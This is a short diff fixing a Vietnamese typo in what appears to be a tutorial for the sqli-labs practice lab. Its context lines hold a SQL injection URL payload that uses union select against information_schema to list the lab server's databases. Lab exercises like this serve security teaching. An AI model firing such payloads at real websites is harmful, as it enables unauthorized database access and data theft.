@@ -11,7 +11,7 @@ http://192.168.80.225/sqli-labs/Less-3/?id=1
 
 ![](../images/lesson4/screen_12.png)
 
-2. Show tấ cả các DB có trong hệ thống
+2. Show tất cả các DB có trong hệ thống
 - Với command
 ```
 http://192.168.80.225/sqli-labs/Less-4/?id=1") union select 1,2,group_concat(SCHEMA_NAME) from information_schema.schemata limit 1,1 --+
